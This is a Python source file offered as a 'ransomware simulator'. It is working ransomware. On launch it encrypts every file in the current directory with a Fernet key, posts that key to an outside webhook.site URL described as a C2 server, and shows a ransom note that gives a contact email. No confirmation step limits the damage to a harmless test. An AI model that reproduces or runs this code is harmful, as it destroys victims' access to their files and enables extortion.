import os
import tkinter as tk
from tkinter import messagebox, scrolledtext
from cryptography.fernet import Fernet
import requests
import threading
import sys

# --- CONFIGURATION ---
WEBHOOK_URL = "https://webhook.site/61b558fe-d5a9-4c87-b0a0-0b9bc5ebb050" 
HACKER_EMAIL = "shadow.cortex@proton.me"
# This is the "marker file" to check if encryption has already been done.
ENCRYPTION_MARKER_FILE = ".encrypted_flag"

class RansomwareSimulatorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("SYSTEM COMPROMISED")
        self.root.geometry("550x450")
        self.root.resizable(False, False) # Prevent resizing
        self.root.config(bg="black") # Set background to black
        
        # --- UI Elements (Hacker Theme) ---
        self.title_label = tk.Label(root, text="SYSTEM COMPROMISED", font=("Courier", 20, "bold"), fg="#FF0000", bg="black")
        self.title_label.pack(pady=(20, 10))

        self.info_label = tk.Label(root, text="Initializing security scan...", font=("Courier", 10), wraplength=500, fg="white", bg="black")
        self.info_label.pack(pady=5, padx=20)

        self.log_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=70, height=12, state='disabled', bg="#111111", fg="#00FF00", font=("Consolas", 9), relief="flat", bd=2)
        self.log_area.pack(pady=10, padx=20)

        self.key_entry_label = tk.Label(root, text="Enter Recovery Key:", font=("Courier", 10), fg="white", bg="black")
        self.key_entry_label.pack()

        self.key_entry = tk.Entry(root, width=55, bg="#222222", fg="#00FF00", relief="flat", insertbackground="white", font=("Courier", 10))
        self.key_entry.pack(pady=5)

        self.decrypt_button = tk.Button(root, text="RECOVER FILES", command=self.decrypt_files, state='disabled', bg="#8B0000", fg="white", relief="flat", activebackground="#B22222", activeforeground="white", font=("Courier", 12, "bold"))
        self.decrypt_button.pack(pady=15)
        
        # --- Main Logic ---
        self.check_encryption_state()

    def log(self, message):
        self.log_area.config(state='normal')
        self.log_area.insert(tk.END, message + "\n")
        self.log_area.config(state='disabled')
        self.log_area.see(tk.END)

    def get_target_files(self):
        script_path = os.path.abspath(sys.argv[0])
        target_files = []
        for file in os.listdir('.'):
            file_path = os.path.abspath(file)
            if os.path.isfile(file_path) and file_path != script_path and os.path.basename(file_path) != ENCRYPTION_MARKER_FILE:
                target_files.append(file)
        return target_files

    def display_ransom_note(self):
        ransom_message = (
            "All your important files have been encrypted.\n"
            "To restore your data, you must acquire a unique recovery key.\n"
            f"Contact us immediately with your unique ID 'victim_01' at: {HACKER_EMAIL}"
        )
        self.info_label.config(text=ransom_message)
        self.decrypt_button.config(state='normal')

    def check_encryption_state(self):
        if os.path.exists(ENCRYPTION_MARKER_FILE):
            self.log("[!] System state is LOCKED. Files are encrypted.")
            self.log("[+] Awaiting recovery key...")
            self.display_ransom_note()
        else:
            self.log("[+] System is clean. Analyzing targets...")
            threading.Thread(target=self.encrypt_files).start()

    def encrypt_files(self):
        self.log("\n[!] Threat detected. Commencing data lockdown...")
        target_files = self.get_target_files()
        if not target_files:
            self.log("[-] No target files found in this directory.")
            self.info_label.config(text="No vulnerable files found. Simulation finished.", fg="cyan")
            return

        key = Fernet.generate_key()
        self.log("[+] Unique encryption key generated.")

        if WEBHOOK_URL == "YOUR_WEBHOOK_URL_HERE":
            self.log("[-] WARNING: Webhook URL not configured. Key will be printed locally.")
            self.log(f"    └── DEMO KEY: {key.decode()}")
        else:
            try:
                requests.post(WEBHOOK_URL, data={"key": key.decode(), "id": "victim_01"})
                self.log("[+] Key successfully exfiltrated to C2 server.")
            except Exception as e:
                self.log(f"[-] FATAL: Could not connect to C2 server. {e}")

        fernet = Fernet(key)
        for filename in target_files:
            try:
                with open(filename, "rb") as f: contents = f.read()
                encrypted_contents = fernet.encrypt(contents)
                with open(filename, "wb") as f: f.write(encrypted_contents)
                self.log(f"    └── Encrypted: '{filename}'")
            except Exception as e:
                self.log(f"    └── Access denied for '{filename}'. Skipping. Error: {e}")

        with open(ENCRYPTION_MARKER_FILE, 'w') as f:
            f.write('locked')
        self.log(f"[+] System state locked. Marker created: '{ENCRYPTION_MARKER_FILE}'")
        
        self.display_ransom_note()

    def decrypt_files(self):
        user_key = self.key_entry.get().strip().encode()
        if not user_key:
            messagebox.showerror("Error", "Recovery key cannot be empty.")
            return

        self.log("\n[+] Initializing decryption protocol with provided key...")
        try:
            fernet = Fernet(user_key)
            files_decrypted = 0
            for filename in self.get_target_files():
                try:
                    with open(filename, "rb") as f: encrypted_contents = f.read()
                    decrypted_contents = fernet.decrypt(encrypted_contents)
                    with open(filename, "wb") as f: f.write(decrypted_contents)
                    self.log(f"    └── Restored: '{filename}'")
                    files_decrypted += 1
                except Exception:
                    self.log(f"    └── Skipping '{filename}' (not an encrypted target).")
            
            if files_decrypted > 0:
                self.log("\n[SUCCESS] Decryption protocol completed. System restored.")
                
                if os.path.exists(ENCRYPTION_MARKER_FILE):
                    os.remove(ENCRYPTION_MARKER_FILE)
                    self.log(f"[+] System unlocked. Marker removed: '{ENCRYPTION_MARKER_FILE}'")

                messagebox.showinfo("Success!", "Your files have been successfully restored.")
                self.title_label.config(text="SYSTEM RESTORED", fg="#00FF00")
                self.info_label.config(text="All threats have been neutralized. You are safe now.")
                self.decrypt_button.config(state='disabled')
            else:
                messagebox.showwarning("Warning", "No files required decryption with this key.")

        except Exception:
            self.log(f"[-] FATAL: Decryption protocol failed. Key is invalid.")
            messagebox.showerror("Decryption Failed", "The recovery key is incorrect or corrupted. Operation failed.")

if __name__ == "__main__":
    root = tk.Tk()
    app = RansomwareSimulatorApp(root)
    root.mainloop()


